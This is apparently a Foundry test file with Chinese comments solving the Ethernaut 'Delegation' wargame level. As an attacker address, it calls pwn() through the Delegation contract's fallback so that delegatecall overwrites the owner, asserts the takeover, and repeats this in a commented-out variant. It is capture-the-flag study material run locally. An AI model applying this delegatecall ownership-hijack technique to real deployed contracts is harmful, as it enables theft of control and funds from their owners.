
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

// 导入目标合约
import "../../src/ethernaut/Delegation.sol";

contract DelegationTest is Test {
    Delegate public delegate;
    Delegation public delegation;
    address public attacker;

    function setUp() public {
        // 设置测试账户
        console.log("addr msg sender:",address(msg.sender));
        attacker = address(0x1234);

        // 部署 Delegate 合约，并设置初始 owner 为 address(this)
        delegate = new Delegate(address(this));

        // 部署 Delegation 合约，并将 delegate 合约地址传入
        delegation = new Delegation(address(delegate));

        // 验证初始状态
        assertEq(delegation.owner(), address(this));
        assertEq(delegate.owner(), address(this));
        console.log("owner ",delegation.owner());
    }

    function testExploit() public {
        // 使用 attacker 地址进行操作
        vm.startPrank(attacker);

        // 构造 pwn() 的函数选择器
        bytes memory data = abi.encodeWithSignature("pwn()");

        // 使用 call 调用 Delegation 合约的 fallback，传入 pwn() 函数的选择器
        console.log("owner ",delegation.owner());
        (bool success,) = address(delegation).call(data);
        require(success, "Call failed");
        console.log("owner ",delegation.owner());
        // 验证攻击是否成功
        assertEq(delegation.owner(), attacker);
        vm.stopPrank();
    }
}


/*
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import "../../src/ethernaut/Delegation.sol";


contract DelegationTest is Test {
    Delegation public contractInstance;
    address public tmp_addr = address(0x11111111111111111);

    function setUp() public {
        console.log("Initial msg.sender:", address(msg.sender));
        vm.startPrank(tmp_addr);  // 用 tmp_addr 作为发送者
        console.log("Pranked msg.sender:", address(msg.sender));

        // 创建 Delegation 实例，传入 Delegate 的假地址
        contractInstance = new Delegation(address(new Delegate(address(0x123))));
        console.log("Initial owner is:", contractInstance.owner());
        vm.stopPrank();
    }

    function test_ack() public {
        // 以 tmp_addr 开始模拟调用
        vm.startPrank(tmp_addr);
        console.log("Owner before delegatecall:", contractInstance.owner());

        // 直接调用合约的 fallback() 方法，通过 pwn() 修改 owner
        (bool success, ) = address(contractInstance).call(
            abi.encodeWithSignature("pwn()")  // 使用正确的函数签名
        );

        console.log("Delegatecall success:", success);
        console.log("Owner after delegatecall:", contractInstance.owner());

        // 检查调用是否成功并观察 owner 的变化
        require(success, "Delegatecall failed");
        assert(contractInstance.owner() == tmp_addr);  // 确认 owner 被修改为 tmp_addr
        vm.stopPrank();
    }
}
*/